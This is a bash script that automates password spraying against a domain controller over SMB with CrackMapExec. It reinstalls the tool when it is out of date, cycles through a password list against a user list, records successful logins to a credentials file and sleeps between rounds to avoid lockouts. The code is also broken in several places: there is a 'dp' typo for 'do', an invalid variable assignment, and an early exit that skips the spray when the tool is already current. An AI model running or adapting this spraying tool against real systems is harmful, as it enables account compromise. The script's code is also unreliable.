#!/bin/bash

#script to auto-spray with cme

#add if loop to check for crackmapexec new (bane or 6.0)

# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - outlog file (not yet)
# $5 - sleep timer

newest=6

current=$(crackmapexec | grep -ia 'version' | cut -d ':' -f 2 | cut -d '.' -f 1)

if [[ $current < $newest ]]; then
	  echo 'gotta update CME...please hold'
	  echo 'removing apt package and downloading current github'
	  cd /opt
	  apt remove crackmapexec
	  rm -rf /opt/CrackMapExec
	  apt install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
	  git clone https://github.com/mpgn/CrackMapExec
	  cd CrackMapExec
	  poetry install
	  echo 'running cme to see if its good to go'
	  poetry run crackmapexec
	  if poetry run crackmapexec | grep -ai "bane"; then
	    	echo "looks like we gucci"
	  else
	   	echo "might need to play with installing cme on your own, this failed"
	    	exit -1
	  fi
else
	  echo 'Current CME is good :)'
	  exit 0
fi

echo "sleeping for 10 sec incase you need to double check me"

#checking to make sure it installed goodly

sleep 10

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

alias crackmapexec="poetry run crackmapexec"
sleep-timer="sleep $5m"
echo "sleep set to ' $5 'mins.  Edit script to change it"

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

sleep 10

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

for pass in $(cat $3); dp
	  crackmapexec smb $1 -u $2 -p $pass --log ~/Documents/sprays/spraygun.txt
	  echo $pass > ~/Documents/sprays/used-passwords.txt
	  echo "found creds: "
	  cat ~/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a ~/Documents/sprays/creds.txt
	  sed -i "/$pass/d" $3
	  $sleep-timer
done


### trying to figure out 2x each
## not going well lol :(
#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



